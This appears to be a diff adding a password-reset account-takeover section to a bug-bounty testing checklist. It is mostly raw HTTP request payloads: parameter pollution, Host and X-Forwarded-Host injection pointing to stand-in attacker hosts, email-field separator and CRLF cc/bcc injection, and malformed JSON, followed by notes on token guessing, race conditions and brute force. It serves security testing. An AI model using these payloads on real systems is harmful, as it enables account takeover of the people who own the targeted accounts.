@@ -243,6 +243,204 @@ Host: target.com
   - Example: `<h1>attacker</h1>`.  
   - Escalate to phishing or XSS attacks.  
 
+1. Parameter pollution
+
+```jsx
+POST /reset HTTP/1.1
+Host: target.com
+...
+
+email=victim@mail.com&email=hacker@mail.com
+```
+
+1. Host header Injection
+
+```jsx
+POST /reset HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com
+...
+
+email=victim@mail.com
+```
+
+```jsx
+Location: http://www.attacker.com/login.php
+X-Forwarded-Host: www.attacker.com
+
+Host: evil-website.com
+
+ Host: vulnerable-website.com
+Host: evil-website.com
+X-Forwarded-For: evil-website.com
+X-Client-IP: evil-website.com
+X-Remote-IP: evil-website.com
+X-Remote-Addr: evil-website.com
+X-Host: evil-website.com
+X-Forwarded-For: attacker.com
+X-Forwarded-Host: attacker.com
+X-Forwarded-Proto: attacker.com
+Host: attacker.com 
+X-Host: attacker.com
+X-Forwarded-Server: attacker.com
+X-HTTP-Host-Override: attacker.com
+Forwarded: attacker.com
+X-Forwarded-For: attacker.com
+X-Forwarded-Host:  attacker.com
+X-Originating-IP: attacker.com
+X-Remote-Addr: attacker.com
+X-Remote-IP: attacker.com
+X-Client-IP: attacker.com
+****
+GET https://vulnerable-website.com/ HTTP/1.1
+Host: evil-website.com
+
+X-Forwarded-For: attacker.com
+X-Forwarded-Host: attacker.com
+X-Forwarded-Proto headers: attacker.com
+Host: attacker.com (duplicate this header)
+X-Host: attacker.com
+X-Forwarded-Server: attacker.com
+X-HTTP-Host-Override: attacker.com
+Forwarded: attacker.com
+
+X-Forwarded-For: attacker.com
+X-Forwarded-Host:  attacker.com
+X-Originating-IP: attacker.com
+X-Remote-Addr: attacker.com
+X-Remote-IP: attacker.com
+X-Client-IP: attacker.com
+```
+
+1. send token with reset password request
+2. change vicitm email to hacker email when resend password reset token
+3. Using separator in value of the parameter
+
+```jsx
+POST /reset HTTP/1.1
+Host: target.com
+...
+
+email=victim@mail.com,hacker@mail.com
+
+POST /reset HTTP/1.1
+Host: target.com
+...
+
+email=victim@mail.com%00hacker@mail.com
+
+POST /reset HTTP/1.1
+Host: target.com
+...
+
+email=victim@mail.com|hacker@mail.com
+
+POST /reset HTTP/1.1
+Host: target.com
+...
+
+email=victim@mail.com%20hacker@mail.com
+
+POST /resetPassword
+[...]
+email=victim@email.com&email=attacker@email.com
+
+POST /resetPassword
+[...]
+email=victim@email.com%20email=attacker@email.com
+
+POST /resetPassword
+[...]
+email=victim@email.com|email=attacker@email.com
+
+ 
+ POST /resetPassword
+[...]
+email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
+
+POST /resetPassword
+[...]
+email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
+
+POST /resetPassword
+[...]
+email="victim@mail.tld",email="attacker@mail.tld"
+
+POST /resetPassword
+[...]
+{"email":["victim@mail.tld","atracker@mail.tld"]}
+
+* send password in request
+
+POST /api/changepass
+[...]
+("form": {"email":"victim@email.tld","password":"12345678"})
+
+* And Aother
+```
+
+1. No domain in value of the paramter
+
+```jsx
+POST /reset HTTP/1.1
+Host: target.com
+...
+
+email=victim
+```
+
+1. No TLD in value of the parameter
+
+```jsx
+POST /reset HTTP/1.1
+Host: target.com
+...
+
+email=victim@mail
+```
+
+1. Using carbon copy
+
+```jsx
+POST /reset HTTP/1.1
+Host: target.com
+...
+
+email=victim@mail.com%0a%0dcc:hacker@mail.com
+```
+
+1. If there is JSON data in body requests, add comma
+
+```jsx
+POST /newaccount HTTP/1.1
+Host: target.com
+...
+
+{"email":"victim@mail.com","hacker@mail.com","token":"xxxxxxxxxx"}
+```
+
+1. Find out how the tokens generate
+
+```jsx
+- Generated based on TimeStamp
+- Generated based on the ID of the user
+- Generated based on the email of the user
+- Generated based on the name of the user
+```
+
+1. Try Cross-Site Scripting (XSS) in the form
+2. send victim reset password and attacker reset password with Race Condition 
+3. **Password Reset Token Leak Via Referrer**
+4. **Guessable UUID**
+5. **Brute Force Password Reset Token**
+6. **Try Using Your Token**
+7. https://x.com/Securrtech/status/1776580537429422217
+8. Reset password wihth eamil 1 , change email to another ,link you have in email one is working ?
+9. https://www.bugcrowd.com/blog/breaking-the-chain-exploiting-oauth-and-forgot-password-for-account-takeover/
+10. https://x.com/Securrtech/status/1776580537429422217
+11.
+
+
 ---
 - https://portswigger.net/research/bypassing-character-blocklists-with-unicode-overflows
 - https://infosecwriteups.com/hubspot-full-account-takeover-in-bug-bounty-4e2047914ab5
